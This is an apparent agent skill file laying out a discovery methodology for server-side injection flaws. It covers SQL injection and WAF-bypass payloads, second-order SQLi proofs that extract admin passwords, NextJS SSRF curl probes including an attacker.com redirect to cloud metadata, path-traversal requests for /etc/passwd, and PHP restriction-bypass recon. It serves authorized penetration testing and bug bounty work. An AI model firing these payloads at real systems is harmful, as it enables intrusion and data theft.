---
name: injection-discovery
description: SQLi, NoSQLi, SSRF, XXE, SSTI, CMDi, LFI, RFI, deserialization, smuggling, cache poisoning, disable_functions bypass. Phase start — surface detection, parameter identification, initial probes. Use when testing INJECTION vulnerabilities.
---

# SKILL-INJECTION-DISCOVERY — Injection Vulnerabilities — Discovery
# Phase Coverage: 3-4, 7-10, 10.1, 16-19, 22-24, 31-32, 38, 40-41
# Vuln Classes: SQLi, NoSQLi, SSRF, XXE, SSTI(inc. VTL/API Gateway), CMDi, LFI, RFI,
#               Deserialization(PHP/Java/Python chains), File Upload(inc. ImageMagick),
#               Smuggling, Cache Poisoning, CRLF, HPP, GraphQL, LDAP, XPath,
#               disable_functions Bypass (Chankro LD_PRELOAD)
# Purpose: Server-side injection vulnerability discovery — triggers, surface types, passive/active recon
# v3.3 HOOKS: OAST Routine (blind injections), Observation Gate (DOM analyzer), Saliency Check (recon output)

---

## v3.3 Automation Hooks — Mandatory for ALL Injection Discovery

```
OBSERVATION GATE (v3.3):
  → After EVERY injection probe, route the response through dom_analyzer.py.
  → NEVER manually compare response bodies with plain-text diffing.
  → Usage: python3 mcp/dom_analyzer.py --control <baseline> --true-condition <injected> --false-condition <inert>
  → Or via MCP: dom_analyze { control, true_condition, false_condition }
  → structural_divergence_detected: true = proceed to HUNT / false = likely false positive

OAST ROUTINE (v3.3) — for blind injection sub-phases:
  → Before ANY blind injection probe: python3 mcp/oast_manager.py --action generate --correlation-id "{vuln}_{endpoint}"
  → Embed the returned callback URL in the payload.
  → After delivery: python3 mcp/oast_manager.py --action poll
  → Or via MCP: oast_generate { correlation_id } → embed → oast_poll

SALIENCY CHECK (v3.3) — before processing recon output:
  → Pipe ALL endpoint lists through: python3 mcp/saliency_filter.py --stdin
  → Drops static assets, 404 pages, empty responses
  → Elevates /api/, /graphql, /auth, /.git/, parameterized inputs
  → Or via MCP: saliency_filter { input_lines }
```

---

## Phase 3: SQL Injection (SQLi) — CIA: C:H I:H A:M

```
TRIGGER: Phase 2 assigns SQLi to a surface, or JS signals DB interaction.
SURFACE TYPES: login, search, filter, user lookup, report generation, any DB-query endpoint.

TIER SYSTEM: Standard → Complex → Advanced
  STANDARD: Basic error-based, union-based, boolean/time-based blind
  COMPLEX: WAF bypass, stacked queries, second-order, out-of-band
  ADVANCED: JSON parameter injection, HTTP parameter pollution SQLi, 
            filter evasion via Unicode, HPP-based split-and-join,
            DNS exfiltration via LOAD_FILE, custom tamper chains
```

### SUB-PHASE 3.1: DISCOVERY

**Standard Discovery:**
  → Passive: mcp_burp_get_proxy_http_history_regex(regex="syntax|error|mysql|sqlite|postgresql|unrecognized|exception|warning")
  → Active: Fuzz parameter with ' " ' OR '1'='1 1 AND 1=2-- 1 UNION SELECT NULL--

**Complex Discovery:**
  → JSON parameter injection: convert GET params to JSON body and test
  → HTTP Parameter Pollution: id=1&id=' OR '1'='1 (backend concatenates)
  → Second-order: store payload in one field, trigger in another view
  → Out-of-band: DNS exfil via LOAD_FILE or xp_dirtree

**Advanced Discovery:**
  → Unicode normalization bypass: %C0%A7 (overlong encoding) → resolves to '
  → HTTP/2 header splitting causing SQLi in concatenated queries
  → GraphQL query injection through nested resolvers
  → AI/ML model prompt injection → SQL generation manipulation

### SUB-PHASE 3.2: WAF Bypass Techniques (2026 Comprehensive)

```
SOURCE: raw/SQL Injection Bug Bounty Reference Guide — WAF Bypass Section
PATTERN: Modern WAFs (Cloudflare, AWS WAF, Imperva, Palo Alto) block obvious
         payloads. These techniques bypass detection while preserving SQL semantics.
```

**Comment Injection (split keywords):**
```
UN/**/ION SE/**/LECT
un/*foo*/ion sel/*bar*/ect
/*!50000UNION*/ /*!50000SELECT*/
```

**Case Randomization:**
```
uNiOn SeLeCt
UnIoN sElEcT
```

**URL Encoding:**
```
%27%20%55%4E%49%4F%4E%20%53%45%4C%45%43%54
%2555%6E%69%6F%6E   (double encoded — proxy decodes once, backend decodes again)
```

**JSON Syntax Bypass (2023-2026 — major WAF bypass):**
```bash
# Team82 proved this bypasses Palo Alto, AWS WAF, Cloudflare, F5, Imperva
# Prepend JSON syntax to SQL payloads to confuse WAF parsers
?id=1' AND 1=JSON_EXTRACT('{"a":1}', '$.a') UNION SELECT * FROM users-- -
?id=1' AND 1=JSON_LENGTH('[1]') UNION SELECT username,password FROM users-- -
```

**HTTP Parameter Pollution (split payload across params):**
```
/?id=1/**/union/*&id=*/select/*&id=*/pwd/*&id=*/from/*&id=*/users
/?id=1' AND '1'='1'/*&id=*/UNION SELECT NULL,username,password FROM users-- -
```

**Whitespace Alternatives:**
```
UNION%09SELECT    (tab)
UNION%0ASELECT    (newline)
UNION%0bSELECT    (vertical tab)
UNION%A0SELECT    (non-breaking space)
UNION%0d%0aSELECT (CRLF)
```

**String Concatenation (when quotes are blocked):**
```sql
-- MySQL
CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))  -- = 'admin'
GROUP_CONCAT(table_name) FROM information_schema.tables

-- MSSQL
CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)

-- PostgreSQL
CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)
```

**Hex Encoding (bypass string filters):**
```
0x61646d696e   = 'admin'
SELECT * FROM users WHERE username = 0x61646d696e
0x27204f52202731273d2731   = ' OR '1'='1
```

**Buffer Overflow WAF Crash:**
```
?id=1+AND+(SELECT+1)=(SELECT+0xAA[..1000 A's..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3
# If the WAF returns 500, it's potentially crashed and bypassed
```

**HPP-based SQLi split-and-join:**
```
# Split keyword across duplicate params — WAF sees fragments, backend joins
GET /search?id=1 union sel ect * from users--
GET /search?id=1&id=union&id=select&id=* from users
# Node.js (array merge): backend sees full payload, WAF sees individual fragments
```

### SUB-PHASE 3.3: Second-Order SQL Injection (2026)

```
SOURCE: raw/SQL Injection Bug Bounty Reference Guide — Section 5
PATTERN: Payload is stored safely, then executed unsafely later. Most missed
         SQLi in bug bounty because testers don't wait for stored data to trigger.

COMMON SCENARIOS:
  1. Registration → Login: malicious username stored, processed during login
  2. File Upload → Dashboard: filename stored in DB, queried for view counts
  3. Profile Update → Admin Panel: user data displayed to admins triggers SQLi
  4. Contact Form → CRM Export: stored message pulled into reports
  5. API Webhook → Background Job: stored URL processed by async worker
```

**Discovery Methodology:**
```bash
# Step 1: Inject test payloads into ALL storage fields
# Register with username: test'||'ing
# Update profile bio with: test' AND '1'='1
# Upload file named: test.php' AND true-- -

# Step 2: Monitor for trigger events
# → Admin views user list (second-order triggers)
# → Report generation uses stored data
# → Background job processes stored payloads
# → Email digest includes stored content

# Step 3: Track injection with unique identifiers
# Use: test_FIELDNAME_UNIXTIME to identify which field triggered

# Step 4: Verify by checking admin panels, exports, reports
# The injection fires when ADMIN or SYSTEM reads the stored data
```

**Real PoC — File Upload → View Count:**
```bash
# Upload file named:
test.php' AND true-- -

# Later, when view count is queried:
test.php' UNION SELECT @@VERSION;-- -
```

**Real PoC — Stored Username → Admin Query:**
```bash
# Register with username:
admin' UNION SELECT password FROM users WHERE username='admin'-- 

# When admin views user list, the injected query executes
# Data leaks in admin dashboard or error messages
```

---

## Phase 4: NoSQL Injection — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns NoSQLi to a surface, or JS signals MongoDB/Mongoose.
SURFACE TYPES: login endpoints, search, any endpoint backed by MongoDB/CouchDB/Firebase/DynamoDB.
```

---

## Phase 7: SSRF — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns SSRF, or JS signals fetch(userInput), axios.get(url).
SURFACE TYPES: URL preview, import/fetch features, webhooks, PDF generators, file URL params.
```

### SUB-PHASE 7.1: DISCOVERY — NextJS-Specific SSRF

```
SOURCE: raw/SSRF.md — Assetnote "Digging for SSRF in NextJS Apps" (May 2024)
CVE: CVE-2024-34351 (Server Actions SSRF, fixed in v14.1.1)
TECH: NextJS _next/image component + Server Actions

THREE DISTINCT SURFACES:
```

**Surface A — `_next/image` Wildcard remotePatterns (Blind SSRF):**
```bash
# Check if _next/image endpoint exists
curl -sk "$TARGET/_next/image?url=/test&w=256&q=75" -w " HTTP:%{http_code}" -o /dev/null

# Check remotePatterns config in next.config.js (if exposed)
curl -sk "$TARGET/next.config.js" | grep -iE 'remotePatterns|hostname|"\*\*"'
curl -sk "$TARGET/_next/static/chunks/pages/_app.js" | grep -i 'remotePatterns'

# Probe for wildcard ** hostname (allows any domain)
curl -sk "$TARGET/_next/image?url=https://127.0.0.1/&w=256&q=75" -w " HTTP:%{http_code}"
# HTTP 200 with valid image or blank = blind SSRF confirmed

# Check if redirects are followed (open redirect chain)
curl -sk -I "$TARGET/_next/image?url=https://attacker.com/redirect?to=http://169.254.169.254/&w=256&q=75"
```

**Surface B — Server Actions SSRF (CVE-2024-34351 Full Read SSRF):**
```bash
# Step 1: Check if Server Actions are defined
# Search JS bundles for "use server" directive
grep -rhi '"use server"\|"use server"\|server.*action' ~/agents/finetune/fullrecon/${SLUG}/js/*.js | sort -u

# Step 2: Extract Next-Action IDs from JS bundles
grep -rohP 'next-action:"[a-f0-9]{40}"' ~/agents/finetune/fullrecon/${SLUG}/js/*.js | sort -u
grep -rohP '"nextAction":"[a-f0-9]{40}"' ~/agents/finetune/fullrecon/${SLUG}/js/*.js | sort -u

# Step 3: Check for SSR action IDs (NextJS 14.2+ Server Actions)
grep -rohP '"[a-f0-9]{40}"' ~/agents/finetune/fullrecon/${SLUG}/js/*.js | sort -u | head -20

# Step 4: Probe Server Actions endpoint with forged Host header
# An action that redirects to / (like login redirect) is needed
ACTION_ID="<extracted_40char_hex>"   # e.g., 15531bfa07ff11369239544516d26edbc537ff9c
curl -sk -X POST "$TARGET/" \
  -H "Host: <your-collaborator>.oastify.com" \
  -H "Next-Action: $ACTION_ID" \
  -H "Content-Type: text/plain" \
  -d '{}' -w " HTTP:%{http_code}"
# If collaborator receives HEAD /redirect-path → SSRF confirmed
```

**Surface C — Open Redirect on Whitelisted Domain:**
```bash
# If remotePatterns is NOT wildcard but specific domains are whitelisted:
# Find open redirects on whitelisted domains → chain with _next/image blind SSRF
# Discovery: check each whitelisted domain for redirect endpoints
# (See SKILL-CLIENTSIDE for open redirect discovery methodology)
```

**Discovery Checklist:**
```
□ Does _next/image endpoint exist? (HTTP 200 on /_next/image?url=...)
□ Are remotePatterns configured with ** wildcard? (any domain allowed)
□ Are specific remotePatterns domains whitelisted? (redirect chain possible)
□ Are Server Actions (use server) compiled into JS bundles?
□ Can Next-Action IDs be extracted from JS/client-side code?
□ Does any action perform a redirect to /path? (login redirect, error redirect)
□ Is dangerouslyAllowSVG enabled? (SVG SSRF → XSS chain)
□ Are internal hosts accessible via blind SSRF? (metadata, internal services)
```

---

## Phase 8: XXE — CIA: C:H I:M

```
TRIGGER: Phase 2 assigns XXE, or content-type application/xml accepted.
SURFACE TYPES: XML file upload, XML import, SOAP endpoints.
```

---

## Phase 9: SSTI — CIA: C:H I:H A:H

```
TRIGGER: Phase 2 assigns SSTI, or JS signals template engine references.
SURFACE TYPES: template-based rendering (email bodies, PDFs, reports, custom pages).
```

### SUB-PHASE 9.4: API GATEWAY VTL RCE (Velocity Template Language)

```
PATTERN: API Gateway mapping templates evaluate attacker-controlled VTL with
         unrestricted Java reflection via exposed helper objects ($util).
SOURCE: raw/exploitarium/floci-apigateway-vtl-rce-poc

DISCOVERY:
  1. Find API Gateway endpoints accepting mapping templates (POST /restapis)
  2. Test if response templates accept VTL directives (#set, #if, $var)
  3. Probe for Java reflection: $util.getClass() in template
  4. Check if IAM enforcement is disabled (default in many dev setups)
```

---

## Phase 10: Command Injection (CMDi) — CIA: C:H I:H A:H

```
TRIGGER: Phase 2 assigns CMDi, or JS signals exec/spawn/child_process.
SURFACE TYPES: ping/traceroute utilities, DNS lookup tools, any feature passing input to shell.
```

---

## Phase 10.1: PHP disable_functions Bypass — CIA: C:H I:H A:H

```
TRIGGER: PHP shell uploaded or code execution achieved, but system()/exec()/passthru() return empty.
SURFACE TYPES: PHP web apps with disable_functions in php.ini, CTF challenges with restricted PHP.
PATTERN: putenv() and/or mail() available while exec/system/passthru/shell_exec are disabled.
```

### SUB-PHASE 10.1.1: DISCOVERY

**Step 1: Confirm restricted functions**
```php
<?php
echo "system:" . (function_exists('system') ? 'YES' : 'NO') . "\n";
echo "exec:" . (function_exists('exec') ? 'YES' : 'NO') . "\n";
echo "passthru:" . (function_exists('passthru') ? 'YES' : 'NO') . "\n";
echo "shell_exec:" . (function_exists('shell_exec') ? 'YES' : 'NO') . "\n";
echo "popen:" . (function_exists('popen') ? 'YES' : 'NO') . "\n";
echo "proc_open:" . (function_exists('proc_open') ? 'YES' : 'NO') . "\n";
echo "putenv:" . (function_exists('putenv') ? 'YES' : 'NO') . "\n";
echo "mail:" . (function_exists('mail') ? 'YES' : 'NO') . "\n";
echo "assert:" . (function_exists('assert') ? 'YES' : 'NO') . "\n";
echo "preg_replace:" . (function_exists('preg_replace') ? 'YES' : 'NO') . "\n";
echo "create_function:" . (function_exists('create_function') ? 'YES' : 'NO') . "\n";
echo "DISABLED:" . ini_get('disable_functions') . "\n";
?>
```

**Step 2: Check for available bypass vectors**
```
PUTENV + MAIL AVAILABLE? → Chankro LD_PRELOAD bypass (most reliable)
PUTENV + NO MAIL? → Try LD_PRELOAD via other child-process triggers
PREG_REPLACE /e MODIFIER? → Code execution via preg_replace (deprecated PHP <7.0)
CREATE_FUNCTION? → Code injection via create_function body
ASSERT? → Code execution via assert()
EVAL? → Direct code execution (unlikely to be available)
```

**Step 3: Check PHP version and SAPI**
```php
<?php
echo "PHP:" . phpversion() . "\n";
echo "SAPI:" . php_sapi_name() . "\n";
echo "OS:" . PHP_OS . "\n";
echo "DOCROOT:" . $_SERVER['DOCUMENT_ROOT'] . "\n";
?>
```

**Step 4: Identify upload path for shared object compilation**
```bash
# Check if gcc is available on target (for .so compilation)
which gcc || echo "NO GCC"
# Check if Python is available (alternative for shell scripts)
which python3 || which python || echo "NO PYTHON"
# Check writable directories
ls -la /tmp /var/tmp /dev/shm 2>/dev/null
```

---

## Phase 16: Insecure Deserialization -- CIA: C:H I:H A:H

```
TRIGGER: Phase 2 assigns deserialization, or JS signals serialize/deserialize/unserialize/pickle.
SURFACE TYPES: PHP apps, Java apps, Python pickle endpoints, .NET BinaryFormatter, Node.js node-serialize.
```

### SUB-PHASE 16.1: DISCOVERY

**Passive:**
  - grep JS for: unserialize, pickle, Serializer, ObjectInputStream, BinaryFormatter, Marshal
  - Burp history search: content-type application/x-php-serialized, application/x-java-serialized
  - Check for base64-encoded serialized objects in cookies/params

**Active:**
  - Send malformed serialized payload: corrupt type markers, wrong lengths
  - Check error messages for: "unserialize", "ClassNotFoundException", "__wakeup", "invalid stream"

---

## Phase 17: File Upload -- CIA: C:H I:H A:H

```
TRIGGER: Phase 2 assigns file-upload, or JS signals upload, multipart, form-data.
```

### SUB-PHASE 17.4: IMAGEMAGICK GHOSTSCRIPT DELEGATE HIJACK

```
PATTERN: ImageMagick processes PDF/PS/EPS via Ghostscript delegate. When the
         delegate command uses a bare executable name (gswin64c.exe), Windows
         resolves it from the current working directory before PATH.
SOURCE: raw/exploitarium/imagemagick-gs-delegate-hijack-poc

DISCOVERY:
  1. Check if target accepts image/PDF upload and processes with ImageMagick
  2. Check if ImageMagick delegates.xml references gswin64c.exe (bare name)
  3. Test if upload directory is writable and used as CWD for conversion
```

---

## Phase 18: Path Traversal / LFI — CIA: C:H

```
TRIGGER: Phase 2 assigns LFI, or JS signals /api/file?name=, /view?page=.
SURFACE TYPES: file download, include/template endpoints, image serving, any ?file= or ?path= param.
```

### SUB-PHASE 18.5: ENCODING BYPASS PATH TRAVERSAL (2026)

```
TRIGGER: Phase 18 finds path traversal but blocked by encoding filter/WAF.
SOURCE: wiki/raw-refs/path-encoding-mutation-2026, wiki/raw-refs/path-traversal-hpp-2026
CVEs: CVE-2026-21726 (Grafana Loki double decode), CVE-2026-30869 (Go/Node.js PathUnescape),
      CVE-2026-35583 (Unicode normalization bypass)

TECHNIQUES:
  1. Double encoding: %252e%252e%252f (proxy decodes once, backend decodes again)
  2. Unicode fullwidth: U+FF0F → / after NFKC normalization
  3. Null byte injection: ..%00.png (legacy C parsers)
  4. Mixed encoding: %252e%252e%00%252f
```

**Discovery:**
```bash
# Double encoding test
curl "$TARGET/view?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"

# Unicode fullwidth bypass
curl "$TARGET/view?file=..%EF%BC%8F..%EF%BC%8Fetc%EF%BC%8Fpasswd"

# Null byte injection
curl "$TARGET/view?file=../../etc/passwd%00.png"

# Mixed encoding
curl "$TARGET/view?file=%252e%252e%00%252fetc/passwd"
```

**Ref:** [[raw-refs/path-encoding-mutation-2026]], [[technique/path-encoding-mutation]]

### SUB-PHASE 18.4: FILE UPLOAD FILENAME PATH TRAVERSAL → LFI

```
SOURCE: wiki/raw-refs/sudohunt-file-upload-lfi.md
PATTERN: When a file upload endpoint uses the attacker-supplied FILENAME
         (from multipart Content-Disposition) to construct the storage path,
         path traversal sequences in the filename cause the server to read
         arbitrary files instead of storing the uploaded content.
         
KEY INSIGHT: The `file=@` parameter sends the LOCAL file's path as the
             multipart filename. If the server uses this filename for storage,
             `../` sequences traverse to arbitrary server files.

DETECTION SIGNATURES:
  - File upload endpoint returns a public URL to the stored file
  - CDN-backed storage (bubble.io, S3, GCS, Azure Blob)
  - No filename sanitization (path traversal characters preserved)
  - Unauthenticated upload access
  - PHP/script extensions treated as static content (no execution)
```

**Discovery:**
```bash
# Step 1: Find file upload endpoints
grep -rhoP '(upload|file|attachment|avatar|media|import|document).*?(action|endpoint|path|url)' \
  ~/agents/finetune/fullrecon/${SLUG}/js/*.js | sort -u

# Step 2: Test basic upload - does it return a public URL?
curl -sk -X POST "$TARGET/upload" \
  -F "file=@/etc/hostname" \
  -w "\nHTTP:%{http_code}" | grep -oP 'https?://[^"\047\s]+'

# Step 3: Check if the filename parameter is reflected in the URL
# If the uploaded file URL contains the original filename → filename is used in path
```

---

## Phase 19: RFI — CIA: C:H I:H A:H

```
TRIGGER: Phase 2 assigns RFI, or PHP app detected with allow_url_include potential.
SURFACE TYPES: PHP applications with allow_url_include=On.
```

---

## Phase 22: HTTP Request Smuggling — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns smuggling, or load-balanced/reverse-proxy infrastructure detected.
SURFACE TYPES: load-balanced apps, reverse proxy setups (nginx + backend, CDN + origin).
```

---

## Phase 23: Web Cache Poisoning — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns cache-poisoning, or CDN headers detected (cf-ray, x-cache).
SURFACE TYPES: pages served via CDN (Cloudflare, Fastly, Akamai, CloudFront).
```

---

## Phase 24: Web Cache Deception — CIA: C:H

```
TRIGGER: Phase 2 assigns cache-deception, or app serves auth content on static-looking paths.
```

---

## Phase 31: HTTP Parameter Pollution (HPP) — CIA: I:M → chains to C:H I:H

```
TRIGGER: Phase 2 assigns parameter-pollution, or WAF bypass needed.
SOURCE: wiki/raw-refs/path-traversal-hpp-2026
CVEs: CVE-2026-21726 (Grafana Loki), CVE-2026-30869 (Go/Node.js)

HPP TYPES:
  1. Server-Side HPP: duplicate params cause different backend behavior
  2. Client-Side HPP (CSPT): URL params control client-side routing
  3. ASP.NET comma merge: id=1,alert(1) → XSS via Request.QueryString
  4. OAuth redirect HPP: redirect_uri with encoded traversal
  5. Rate limit bypass: duplicate params split across backend instances
  6. Server-Side Parameter Smuggling (SSPP): encoded injection in param name
```

### SUB-PHASE 31.1: DISCOVERY

**Passive:**
  - Check JS for URL building with duplicate params
  - Look for multi-backend architecture (WAF/CDN → backend)
  - Identify endpoints with multiple parameters of same name

**Active:**
```bash
# Framework detection — how does the backend handle duplicate params?
curl -sk "$TARGET/api/test?a=1&a=2" \
  -H "Authorization: Bearer $USER1_TOKEN" | jq .
# PHP: last value wins → a=2
# Node.js/Express: creates array → a=["1","2"]
# ASP.NET: joins with comma → a="1,2"
# Flask/Werkzeug: first value wins → a=1

# Server chain detection
curl -sk -I "$TARGET/" | grep -iE 'server|x-powered-by|cf-ray|x-cache|x-amz'
# WAF + backend = HPP can split payloads
```

---

## Phase 32: GraphQL Security — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns graphql, or JS signals Apollo, urql, gql.
SURFACE TYPES: GraphQL endpoints (/graphql, /api/graphql, /gql, /query).
```

### SUB-PHASE 32.1: DISCOVERY

**Endpoint Discovery:**
  → Fuzz paths: /graphql, /api/graphql, /v1/graphql, /gql, /query, /graphiql
  → Check for `__typename` response to `{"query":"{__typename}"}` (200 = GraphQL)
  → Look for Apollo, urql, gql in JS bundles
  → WebSocket endpoints: wss://target.com/graphql, /subscriptions

**Attack Surface Mapping:**
  → Global IDs: base64-encoded sequential integers in responses (gid://service/Type/123)
  → Aliases: test if endpoint supports aliased queries
  → Batching: test if array body is accepted
  → Subscriptions: check WebSocket upgrade with custom Origin
  → Introspection: test __schema (may be disabled via regex)
  → Resolver nesting: deep field access patterns

**Spring Boot Actuator Discovery (Phase 46 Extension):**
  → Fuzz: /actuator, /actuator/env, /actuator/heapdump, /actuator/jolokia
  → Fuzz: /actuator/gateway/routes, /actuator/loggers, /actuator/configprops
  → Fuzz: /cloudfoundryapplication, /healthz
  → Spring Boot 1.x: /env, /heapdump, /jolokia (no /actuator prefix)
  → Check for `spring-boot-actuator-autoconfigure` without `spring-boot-health` (CVE-2026-40976)
  → Shodan: `http.favicon.hash:-534530225` or `"spring-boot" "actuator"`

---

## Phase 38: CRLF Injection & Header Injection — CIA: I:M (base) → chains to C:H I:H

```
TRIGGER: Phase 2 assigns crlf, or redirect endpoints/URL-reflecting responses detected.
SURFACE TYPES: redirect handlers, URL-reflecting responses, cookie-setting endpoints,
               file upload filename reflection, preference/theme settings.
DEFINITION: CWE-93 — inject \r\n (CRLF) into HTTP response headers to terminate
            current header and inject new ones or split into new HTTP response body.
```

### SUB-PHASE 38.1: DISCOVERY

**Injection Point Mapping:**
  → URL params: ?redirect=, ?next=, ?url=, ?return=, ?goto=
  → Request headers: User-Agent, Referer, X-Forwarded-*, custom headers
  → Cookies: values reflected in responses
  → Form inputs: theme, language, preference settings that set cookies
  → File uploads: filename reflected in Content-Disposition

**Passive Detection:**
  → Proxy history: look for status code changes (403→200) when headers modified
  → Response length variations across header values
  → Reflected header values in response bodies
  → Redirects to unexpected domains

**Active Detection:**
  → Inject `%0d%0aX-Test: {canary}` into each parameter → check if header appears in response
  → Fuzz User-Agent, Referer, X-Forwarded-For with CRLF payloads
  → Test redirect endpoints with CRLF in URL parameters

**2026 CVE Awareness:**
  → CVE-2026-0865: Python wsgiref.headers — control chars (0x00-0x1F, 0x7F) in header names
  → CVE-2026-3634: GNOME libsoup — CRLF in Content-Type values
  → CVE-2026-29046: TinyWeb — CR/LF/NUL + %0d/%0a/%00 in CGI env vars
  → CVE-2026-29777: Traefik — unsanitized header/query match in HTTPRoute

---

## Phase 40: LDAP Injection — CIA: C:H I:M

```
TRIGGER: Phase 2 assigns ldap, or JS signals ldap, activedirectory, ldapjs.
SURFACE TYPES: LDAP-backed login, directory search, corporate SSO, Active Directory auth.
```

---

## Phase 41: XPath Injection — CIA: C:H I:M

```
TRIGGER: Phase 2 assigns xpath, or JS signals xpath, XPathEvaluator.
SURFACE TYPES: XML-backed auth, XML data stores, SOAP services.
```

---

*SKILL-INJECTION-DISCOVERY — Part of the acy Agentic Security Research System v3.0*
